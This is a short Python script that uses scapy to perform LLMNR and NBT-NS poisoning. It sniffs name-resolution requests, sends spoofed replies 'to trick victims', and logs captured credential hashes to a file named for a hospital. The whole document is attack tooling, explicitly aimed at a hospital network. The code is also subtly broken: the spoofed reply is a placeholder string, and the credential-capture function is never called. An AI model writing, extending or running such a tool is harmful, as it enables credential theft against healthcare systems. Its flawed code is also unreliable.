import scapy.all as scapy
import socket
import sys

# Define the network interface to listen on
INTERFACE = "eth0"

def sniff_requests():
    """Sniff LLMNR and NBT-NS requests on the network"""
    print("[*] Listening for LLMNR and NBT-NS requests...")
    scapy.sniff(filter="udp port 137 or udp port 5355", prn=process_packet, store=False)

def process_packet(packet):
    """Process captured packets and check for LLMNR or NBT-NS requests"""
    if packet.haslayer(scapy.UDP) and packet.haslayer(scapy.Raw):
        payload = packet[scapy.Raw].load.decode(errors="ignore")
        if "QUERY" in payload:
            print(f"[!] Detected request for: {payload}")
            send_spoofed_response(packet)

def send_spoofed_response(packet):
    """Send a spoofed response to trick victims"""
    response_packet = scapy.IP(dst=packet[scapy.IP].src) / \
                    scapy.UDP(dport=packet[scapy.UDP].sport) / \
                    scapy.Raw(load="FAKE_RESPONSE")
    scapy.send(response_packet, verbose=False)
    print("[+] Spoofed response sent")
def capture_credentials(data):
    """Capture and log authentication attempts"""
    with open("hospital_hashes.txt", "a") as file:
        file.write(data + "\n")
    print("[+] Captured credentials saved")
def main():
    try:
        print("[*] Starting hospital network LLMNR and NBT-NS poisoning script...")
        sniff_requests()
    except KeyboardInterrupt:
        print("\n[!] Script terminated by user.")
        sys.exit(0)
if __name__ == "__main__":
    main()
